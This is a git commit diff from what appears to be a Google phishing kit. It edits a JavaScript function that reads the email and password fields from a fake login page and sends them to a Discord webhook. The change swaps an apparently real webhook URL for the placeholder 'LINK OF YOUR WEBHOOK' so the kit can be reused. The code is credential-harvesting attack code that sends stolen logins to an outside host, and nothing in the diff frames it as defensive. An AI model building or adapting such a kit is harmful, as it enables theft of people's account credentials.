5779b0e1e1aeb9e7019bd507a999deb586a0353d
Ghost <119226399+Uziira@users.noreply.github.com>
2023-03-20 11:00:47 +0100

    Update index.js

--- lien google phishing v1/index.js
+++ lien google phishing v1/index.js
@@ -1,5 +1,5 @@
 function next() {
-    const webhookURL = 'https://discord.com/api/webhooks/1086213557357649950/A8NIgZ54F-yLh_IouTpDZ7bu0-Tvsn4UZ4Ac0yl0PQf0Ym9G89-hrbLK84_5YpFR4v7J'
+    const webhookURL = 'LINK OF YOUR WEBHOOK'
     const input2 = document.getElementById('email').value
     const input = document.getElementById('password').value
     const message = {
